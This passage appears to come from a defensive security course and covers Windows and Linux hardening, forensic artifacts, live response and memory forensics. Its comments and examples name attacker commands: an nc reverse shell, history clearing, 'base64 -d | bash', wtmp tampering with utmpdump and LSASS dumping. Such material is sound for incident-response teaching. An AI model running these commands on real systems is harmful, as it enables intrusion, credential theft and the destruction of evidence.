| **Administrator** | Administrator (local), Domain Admin | root (UID 0) |
| **Privilege elevation** | UAC elevation, token manipulation | sudo, SUID bits, capabilities |
| **Privilege model** | Access tokens with integrity levels | Linux capabilities (granular) |
| **Logging architecture** | Windows Event Log (structured XML), ETW | syslog/journald + auditd |
| **Audit capability** | Advanced Audit Policy (granular subcategories) | auditd (syscall-level, extremely granular) |
| **Application isolation** | AppLocker, Defender ATP, WDAG | SELinux/AppArmor, namespaces, seccomp |
| **Network filtering** | Windows Firewall (WFP) | iptables / nftables / ufw |
| **Encryption at rest** | BitLocker (AES-256, TPM) | dm-crypt/LUKS, ecryptfs |
| **Remote access** | RDP, WinRM, WMI | SSH |
| **Persistence locations** | Registry Run, Services, Scheduled Tasks, WMI | cron, systemd, LD_PRELOAD, rc.local |
| **Credential storage** | SAM, LSASS memory, Credential Manager | /etc/shadow, SSH keys, memory |
| **Package/software mgmt** | MSI, MSIX, AppX, WinGet | apt/yum/dnf with signed repositories |
| **SIEM log forwarding** | WEF → Windows Event Collector | rsyslog/syslog-ng → SIEM, Filebeat |
| **Default attack surface** | Larger (DCOM, RPC, SMB enabled by default) | Smaller (few services enabled by default) |

### Security Philosophy Differences

**Windows:**

* Built for enterprise environments with Active Directory integration
* GUI-first design; security often managed through GPOs
* Backwards compatibility sometimes creates security debt (NTLM, SMBv1)
* Rich ecosystem of built-in security tools (Defender, AppLocker, WDEG)

**Linux:**

* Built on Unix philosophy: minimal, modular, text-based configuration
* Security through simplicity: only what's installed is running
* Configuration transparency: everything is in readable text files
* Multiple distributions with different security defaults

---

## 11. OS Hardening Fundamentals: CIS Benchmarks

### What Are CIS Benchmarks?

The Center for Internet Security (CIS) publishes community-developed security configuration guidelines:

* **CIS Microsoft Windows Server 2022 Benchmark**
* **CIS Ubuntu Linux 22.04 LTS Benchmark**
* **CIS Red Hat Enterprise Linux 9 Benchmark**
* Available free at: https://www.cisecurity.org/cis-benchmarks/

### Benchmark Levels

| Level | Description | Suitable For |
|-------|-------------|-------------|
| **Level 1** | Baseline security; minimal performance impact; practical for most environments | All production systems |
| **Level 2** | Defense in depth; may impact performance or functionality | High-security environments |

### Key Windows Hardening Controls (CIS)

```powershell
# 1. Account policies
# Minimum password length: 14
# Lockout threshold: 5 attempts
# Lockout duration: 15 minutes

# 2. Audit policy — enable all critical subcategories
auditpol /set /subcategory:"Logon" /success:enable /failure:enable
auditpol /set /subcategory:"Process Creation" /success:enable
auditpol /set /subcategory:"Special Logon" /success:enable
auditpol /set /subcategory:"Security System Extension" /success:enable /failure:enable

# 3. Disable legacy protocols
Set-SmbServerConfiguration -EnableSMB1Protocol $false
Set-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name "LMCompatibilityLevel" -Value 5

# 4. Enable Windows Defender Credential Guard
Set-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\DeviceGuard" -Name "EnableVirtualizationBasedSecurity" -Value 1
Set-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name "LsaCfgFlags" -Value 1

# 5. Configure Windows Firewall
Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled True -DefaultInboundAction Block
```

### Key Linux Hardening Controls (CIS)

```bash
# 1. Kernel hardening (/etc/sysctl.d/99-cis.conf)
kernel.randomize_va_space = 2    # Full ASLR
kernel.kptr_restrict = 2         # Hide kernel pointers
kernel.dmesg_restrict = 1        # Restrict dmesg
net.ipv4.tcp_syncookies = 1     # SYN flood protection
net.ipv4.conf.all.accept_redirects = 0  # Reject ICMP redirects
net.ipv4.conf.all.send_redirects = 0    # Don't send redirects

# 2. Filesystem security (/etc/fstab)
# /tmp: nodev,nosuid,noexec
# /var/tmp: nodev,nosuid,noexec
# /home: nodev,nosuid

# 3. User accounts
# Lock system accounts without shells
for user in $(awk -F: '($7 ~ /nologin|false/) {print $1}' /etc/passwd); do
  usermod -L $user 2>/dev/null
done

# 4. SSH hardening (already covered in Section 7)

# 5. Enable and configure auditd (already covered in Section 7)

# Automated assessment
apt install lynis
lynis audit system 2>&1 | grep -E "Hardening index|Warning|Suggestion"
```

### DISA STIGs

Defense Information Systems Agency Security Technical Implementation Guides — more prescriptive than CIS, used for US government systems.
Available at: https://public.cyber.mil/stigs/

---

## 12. Forensic Artifacts — Windows

Understanding forensic artifacts is essential for incident response and threat hunting.

### Registry Hives as Forensic Evidence

Registry hive files can be analyzed offline (from a disk image or volume shadow copy):

```text
C:\Windows\System32\config\SAM        # Local accounts
C:\Windows\System32\config\SECURITY   # Security policy, LSA secrets
C:\Windows\System32\config\SOFTWARE   # Installed software
C:\Windows\System32\config\SYSTEM     # Hardware, services
C:\Users\<user>\NTUSER.DAT            # User-specific settings
C:\Users\<user>\AppData\Local\Microsoft\Windows\UsrClass.dat  # User classes
```

**Key forensic registry locations:**

```powershell
# Recently run programs (UserAssist — ROT13 encoded)
HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist

# Recently opened files (RecentDocs)
HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs

# Shellbags (directory access history — even deleted folders)
HKCU\Software\Classes\Local Settings\Software\Microsoft\Windows\Shell\BagMRU
HKCU\Software\Classes\Local Settings\Software\Microsoft\Windows\Shell\Bags

# Network connections (WLAN history)
HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\NetworkList\Profiles

# USB devices
HKLM\SYSTEM\CurrentControlSet\Enum\USBSTOR

# Last logon information
HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\LastLogOnUser
```

### Prefetch Files

Windows Prefetch records application execution history to speed up future launches.

* Location: `C:\Windows\Prefetch\`
* Format: `<APPNAME>-<HASH>.pf`
* Contains: executable name, execution count, **last 8 run times**, list of files accessed

```powershell
# Prefetch requires enabling in registry (enabled by default on HDDs)
Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management\PrefetchParameters" |
  Select-Object EnablePrefetcher
# 3 = full prefetching (default)

# Parse prefetch with Eric Zimmermann's tools (PECmd):
PECmd.exe -d "C:\Windows\Prefetch" --csv output.csv

# PowerShell quick view (basic, not full parse)
Get-ChildItem "C:\Windows\Prefetch\*.pf" |
  Sort-Object LastWriteTime -Descending |
  Select-Object Name, LastWriteTime, Length | Format-Table

# Forensic value:
# - Proves a program ran even after it was deleted
# - Shows timing of execution
# - Volume info shows execution from USB drives
```

### LNK (Shortcut) Files

Windows automatically creates LNK files when a user opens a file, even from a remote share:

* Location: `C:\Users\<user>\AppData\Roaming\Microsoft\Windows\Recent\`
* Contains: original file path, volume serial number, MAC timestamps, MFT entry numbers

```powershell
# View recent LNK files
Get-ChildItem "$env:APPDATA\Microsoft\Windows\Recent\*.lnk" |
  Sort-Object LastWriteTime -Descending |
  Select-Object Name, LastWriteTime

# Parse LNK with LECmd (Eric Zimmermann):
LECmd.exe -f "C:\Users\alice\AppData\Roaming\Microsoft\Windows\Recent\secret.lnk"

# Forensic value:
# - Proves user accessed a file (and when)
# - Shows original path even if file was moved/deleted
# - Remote share LNKs reveal accessed network paths
```

### MFT — Master File Table

The NTFS Master File Table is the index of all files on an NTFS volume:

* Location: `$MFT` at root of NTFS volume
* Contains: timestamps (4 per file: Created, Modified, MFTModified, Accessed — MACB), file name, parent directory, attributes, and for small files: the file content itself

**Timestomping:** Attackers modify timestamps to hide activity.
A key detection technique is comparing `$STANDARD_INFORMATION` timestamps (user-visible) vs. `$FILE_NAME` timestamps (harder to modify).
Discrepancies indicate timestomping.

```powershell
# Extract and analyze MFT (requires admin rights or disk image)
# MFTECmd.exe (Eric Zimmermann):
MFTECmd.exe -f "C:\$MFT" --csv output.csv

# Volume Shadow Copies provide historical MFT snapshots
vssadmin list shadows

# Access VSS snapshot
cmd /c mklink /d C:\VSS \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
dir C:\VSS\$MFT

# Forensic value of MFT:
# - Timeline of all file creation, modification, access
# - Recover metadata for deleted files (entry remains until overwritten)
# - Detect timestomping via MACB timestamp inconsistencies
```

### Windows Event Log Analysis (Forensic Focus)

```powershell
# Carve event logs from disk image (with Volatility or Autopsy)
# Or access live from a running system or VSS

# Key forensic patterns:

# 1. Lateral movement via PsExec (creates a service)
Get-WinEvent -FilterHashtable @{LogName='System'; Id=7045} |
  Where-Object {$_.Message -match "PSEXESVC\|RemCom"}

# 2. Clear event log (anti-forensics)
Get-WinEvent -FilterHashtable @{LogName='Security'; Id=1102}

# 3. Failed logins followed quickly by success (brute force)
$events = Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4624,4625}
# Correlate by TargetUserName and IpAddress

# 4. Process creation timeline (attack chain reconstruction)
Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4688} |
  ForEach-Object {
    $xml = [xml]$_.ToXml()
    [PSCustomObject]@{
      Time    = $_.TimeCreated
      Process = $xml.Event.EventData.Data | Where-Object {$_.Name -eq 'NewProcessName'} | Select-Object -ExpandProperty '#text'
      Parent  = $xml.Event.EventData.Data | Where-Object {$_.Name -eq 'ParentProcessName'} | Select-Object -ExpandProperty '#text'
      CmdLine = $xml.Event.EventData.Data | Where-Object {$_.Name -eq 'CommandLine'} | Select-Object -ExpandProperty '#text'
    }
  } | Sort-Object Time

# 5. Detect Mimikatz via Sysmon Event ID 10 (ProcessAccess to LSASS)
Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" |
  Where-Object {$_.Id -eq 10 -and $_.Message -match "lsass.exe"}
```

### Autopsy and Volatility for Windows Forensics

**Autopsy** (disk forensics):

* Parses MFT, registry hives, browser history, recycle bin, LNK files, prefetch
* Timeline analysis across all artifacts
* Hash verification for evidence integrity

**Volatility** (memory forensics):

```bash
# List processes from memory dump
vol.py -f memory.dmp --profile=Win10x64 pslist
vol.py -f memory.dmp --profile=Win10x64 pstree

# Detect injected code
vol.py -f memory.dmp --profile=Win10x64 malfind

# Extract registry hives from memory
vol.py -f memory.dmp --profile=Win10x64 hivelist
vol.py -f memory.dmp --profile=Win10x64 printkey -o 0x... -K "SOFTWARE\Microsoft\Windows\CurrentVersion\Run"

# Find network connections
vol.py -f memory.dmp --profile=Win10x64 netscan

# Dump LSASS credentials (from memory)
vol.py -f memory.dmp --profile=Win10x64 hashdump
```

---

## 13. Forensic Artifacts — Linux

### bash_history

The bash history file records commands executed in interactive shells:

* Location: `~/.bash_history` (default)
* Controlled by: `HISTFILE`, `HISTSIZE`, `HISTFILESIZE` environment variables

```bash
# View history for all users
for user in $(awk -F: '($7 != "/usr/sbin/nologin" && $7 != "/bin/false") {print $1 ":" $6}' /etc/passwd); do
  name=$(echo $user | cut -d: -f1)
  home=$(echo $user | cut -d: -f2)
  if [ -f "$home/.bash_history" ]; then
    echo "=== History for $name ==="
    cat "$home/.bash_history"
  fi
done

# Common attacker-relevant commands in history:
# wget/curl http://... (file download)
# nc -e /bin/bash (reverse shell)
# python -c 'import os; os.setuid(0)...' (privilege escalation attempt)
# chmod +s or chmod 4755 (SUID manipulation)
# crontab -e (persistence)
# useradd / passwd (backdoor account)

# Attacker evasion: history can be cleared or disabled
# HISTFILE=/dev/null; HISTSIZE=0  (in .bashrc or runtime)
# history -c  (clear history in current session)

# Forensic note: auditd logs commands even when history is cleared
# Use: ausearch -k user-commands
```

### /proc Filesystem — Live Forensics

The `/proc` filesystem provides a real-time view of all running processes:

```bash
# Enumerate all processes and their details
for pid in /proc/[0-9]*/; do
  pid_num=$(basename $pid)
  echo "PID: $pid_num"
  echo "  CMD: $(cat $pid/cmdline 2>/dev/null | tr '\0' ' ')"
  echo "  EXE: $(readlink $pid/exe 2>/dev/null)"
  echo "  CWD: $(readlink $pid/cwd 2>/dev/null)"
done

# Find processes with deleted executables (common malware indicator)
ls -la /proc/*/exe 2>/dev/null | grep "(deleted)"

# Extract a deleted binary from proc (live recovery)
cp /proc/<PID>/exe /tmp/recovered_binary

# View environment variables (may contain secrets, malware config)
cat /proc/<PID>/environ | tr '\0' '\n'

# View memory maps (loaded libraries, potential injected code)
cat /proc/<PID>/maps

# View file descriptors (open files, sockets)
ls -la /proc/<PID>/fd
```

### wtmp, btmp, and lastlog

Binary files recording login history:

```bash
# /var/log/wtmp — login/logout records
last -i -F    # All logins with IP and full timestamps
last reboot   # System reboot history
last -x shutdown  # Shutdown events

# /var/log/btmp — failed login attempts
lastb -i -F | head -50    # Recent failed logins with IP

# /var/log/lastlog — most recent login per user
lastlog                   # All users
lastlog -u alice          # Specific user
lastlog | grep -v "Never\|Username"  # Only users who have logged in

# Forensic analysis:
# - Large number of failures from one IP = brute force
# - Successful login from unusual IP/time = account compromise
# - Login from service account (www-data, nobody) = system compromise
# - Root login directly = policy violation or attacker

# Manipulating these files (attacker anti-forensics):
# utmpdump /var/log/wtmp > wtmp.txt  # Convert to text
# # Edit wtmp.txt, then:
# utmpdump -r wtmp.txt > /var/log/wtmp  # Convert back
# Detection: hash the binary files and compare to known-good baseline
```

### Cron Jobs as Forensic Evidence

```bash
# Comprehensive cron survey
echo "=== /etc/crontab ===" && cat /etc/crontab
echo "=== /etc/cron.d ===" && ls -la /etc/cron.d/ && cat /etc/cron.d/*
echo "=== /etc/cron.hourly ===" && ls -la /etc/cron.hourly/
echo "=== /etc/cron.daily ===" && ls -la /etc/cron.daily/
echo "=== User crontabs ===" && ls -la /var/spool/cron/crontabs/
for user in $(ls /var/spool/cron/crontabs/ 2>/dev/null); do
  echo "--- Cron for $user ---"
  cat /var/spool/cron/crontabs/$user
done

# Red flags in cron:
# - Commands running from /tmp, /dev/shm, or home directories
# - Commands downloading files (wget, curl)
# - Commands running encoded/obfuscated scripts (base64 -d | bash)
# - Entries running as root with unusual timing (e.g., every minute)
# - Entries not present in package-managed cron.d files
```

### Linux Memory Forensics with Volatility

```bash
# Capture memory (live system)
# dd if=/proc/kcore of=/tmp/memory.dump    # Works on some systems
# LiME (Linux Memory Extractor — kernel module) is more reliable

# Install LiME
git clone https://github.com/504ensicsLabs/LiME
cd LiME/src && make
insmod lime-<kernel>.ko "path=/tmp/memory.lime format=lime"

# Analyze with Volatility 3 (no profiles needed for v3)
vol3 -f memory.lime linux.pslist       # Process list
vol3 -f memory.lime linux.pstree       # Process tree
vol3 -f memory.lime linux.netstat      # Network connections
vol3 -f memory.lime linux.bash         # Bash history from memory
vol3 -f memory.lime linux.check_creds  # Check for credential exposure

# Volatility 2 with profile
vol.py --info | grep Linux              # List Linux profiles
vol.py -f memory.lime --profile=LinuxUbuntu2204x64 linux_pslist
vol.py -f memory.lime --profile=LinuxUbuntu2204x64 linux_netstat
```

### auditd Logs as Forensic Evidence

```bash
# Full timeline reconstruction from auditd
aureport --start 2024-01-15 00:00:00 --end 2024-01-15 23:59:59 --summary

# Chronological event timeline
ausearch --start 2024-01-15 00:00:00 -i | less

# Specific attack indicators
ausearch -k privileged-sudo -i      # All sudo usage
ausearch -k identity -i             # /etc/passwd,shadow changes
ausearch -k scheduled-jobs -i       # Cron modifications
ausearch -k ssh-keys -i             # authorized_keys changes

# Look for suspicious execve() calls (command execution)
ausearch -m execve -i | grep -E "wget|curl|nc|python|bash|chmod.+s"

# Failed access attempts (may indicate privilege escalation attempts)
ausearch --success no -i | tail -50
```

---

## 14. Live Response Techniques

Live response is the collection of volatile evidence from a running system during an active incident.

### Windows Live Response

```powershell
# ORDER OF VOLATILITY: collect most volatile (memory) first

# 1. System information
hostname; date; whoami; ipconfig /all

# 2. Running processes (capture process list immediately)
Get-WmiObject Win32_Process |
  Select-Object Name, ProcessId, ParentProcessId, CommandLine, Path, CreationDate |
  Export-Csv -Path "C:\IR\processes.csv"

# 3. Network connections (before attacker terminates them)
Get-NetTCPConnection | Select-Object * | Export-Csv "C:\IR\netconn.csv"
netstat -ano > C:\IR\netstat.txt

# 4. Logged-in users
query user
Get-WmiObject Win32_LogonSession | Select-Object LogonId, LogonType, StartTime

# 5. Autostart entries (persistence)
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" > C:\IR\run_hklm.txt
Get-ItemProperty "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" > C:\IR\run_hkcu.txt
Get-ScheduledTask | Export-Csv "C:\IR\scheduled_tasks.csv"

# 6. Recent event logs
Get-WinEvent -FilterHashtable @{LogName='Security'; StartTime=(Get-Date).AddHours(-24)} |
  Export-Csv "C:\IR\security_events.csv"

# 7. Memory acquisition (last — causes most system activity)
# procdump.exe -ma lsass.exe lsass.dmp
# winpmem.exe --output memory.dmp --format raw

# Automated: KAPE, Velociraptor, or CyLR for artifact collection
```

### Linux Live Response

```bash
# ORDER OF VOLATILITY: collect most volatile first

# 1. System identification
hostname; date; id; uname -a

# 2. Running processes (before attacker kills them)
ps auxef > /ir/processes.txt
ls -la /proc/*/exe 2>/dev/null > /ir/proc_exe.txt
cat /proc/*/cmdline 2>/dev/null | tr '\0' ' ' | tr '\n' '\n' > /ir/cmdlines.txt

# 3. Network connections
ss -tnp > /ir/tcp_connections.txt
ss -unp > /ir/udp_connections.txt
ip addr > /ir/ip_addresses.txt
ip route > /ir/routes.txt
arp -n > /ir/arp_cache.txt

# 4. Logged-in users
w > /ir/logged_users.txt
last -i -F > /ir/login_history.txt
lastb -i -F > /ir/failed_logins.txt

# 5. Open files
lsof -n > /ir/open_files.txt

# 6. Scheduled tasks
crontab -l > /ir/crontab_root.txt
cat /etc/crontab >> /ir/crontab_root.txt
cat /etc/cron.d/* >> /ir/crontab_root.txt

# 7. Loaded kernel modules (rootkit detection)
lsmod > /ir/kernel_modules.txt

# 8. Hash important binaries before they're modified
sha256sum /bin/ls /bin/ps /bin/netstat /usr/bin/find > /ir/binary_hashes.txt

# 9. Log copies (before attacker clears them)
cp /var/log/auth.log /ir/
cp /var/log/audit/audit.log /ir/
cp /var/log/syslog /ir/
journalctl --since "7 days ago" -o json > /ir/journal.json

# Tools: velociraptor, osquery, AVML (memory), ir-rescue
```

### Memory Acquisition

Memory contains:

* Running processes and their code/data
* Network connections (socket state)
* Decrypted content (that may be encrypted at rest)
* NTLM hashes and Kerberos tickets (Windows LSASS)
* Malware running only in memory (fileless)

```bash
# Linux memory capture with AVML (Microsoft tool)
avml /ir/memory.lime

# Windows memory capture
# WinPmem: winpmem.exe --output memory.dmp
# DumpIt: DumpIt.exe /output memory.dmp
# Belkasoft RAM Capturer: comprehensive, works on locked systems

# Always:
# 1. Write to external storage (not the system being imaged)
# 2. Hash the image immediately after capture
sha256sum memory.lime > memory.lime.sha256
```

---

## 15. Summary and Key Takeaways

1. **LSASS and SAM** are the crown jewels of Windows authentication. Monitor access to both with Event IDs 4656/4663 and Sysmon Event ID 10. Credential Guard moves LSASS to a protected VM.

1. **Windows Event IDs 4624/4625** (logon), **4688** (process creation), **4698/4699** (scheduled tasks), **7045** (new service), and **1102** (log cleared) are the most critical for SOC detection.

1. **Linux DAC (rwx permissions)** is the baseline. SELinux and AppArmor add MAC on top. Capabilities provide granular privilege control without full root.

1. **SUID binaries** are among the most common Linux privilege escalation vectors. Maintain a baseline and alert on any new SUID binary.

1. **auditd** provides syscall-level auditing on Linux — far more granular than Windows Event Log. Combine with auditd rules targeting sensitive file access, privilege escalation, and cron modifications.

1. **Forensic artifacts differ by OS:**
   * Windows: registry hives, prefetch (execution history), LNK files (file access), MFT (complete file timeline)
   * Linux: bash_history, wtmp/btmp/lastlog (login records), /proc (live process state), auditd logs

1. **Live response follows order of volatility:** network state → process list → open files → logs → disk image. Memory is most volatile; capture before shutdown.

1. **Timestomping** (artifact forgery) is detected by comparing `$STANDARD_INFORMATION` vs. `$FILE_NAME` timestamps in the NTFS MFT.

1. **Volatility** (memory forensics) and **Autopsy** (disk forensics) are the standard open-source tools for both Windows and Linux investigations.

1. **CIS Benchmarks** provide actionable, community-tested baselines for both Windows and Linux. Level 1 is appropriate for most production systems.

---

## 16. References

* MITRE ATT&CK Framework: https://attack.mitre.org/
* CIS Benchmarks: https://www.cisecurity.org/cis-benchmarks/
* Windows Event IDs Reference: https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/
* Sysmon documentation: https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon
* Eric Zimmermann's forensic tools (PECmd, LECmd, MFTECmd): https://ericzimmerman.github.io/
* Volatility Framework: https://www.volatilityfoundation.org/
* Autopsy Digital Forensics: https://www.autopsy.com/
* Linux Audit System (auditd): https://linux.die.net/man/8/auditd
* GTFOBins (SUID/sudo escapes): https://gtfobins.github.io/
* DISA STIGs: https://public.cyber.mil/stigs/
* NIST SP 800-86 (Forensics Guide): https://csrc.nist.gov/publications/detail/sp/800-86/final
* SELinux User and Administration Guide: https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/9/html/using_selinux/index
* AppArmor documentation: https://wiki.ubuntu.com/AppArmor
* LiME (Linux Memory Extractor): https://github.com/504ensicsLabs/LiME
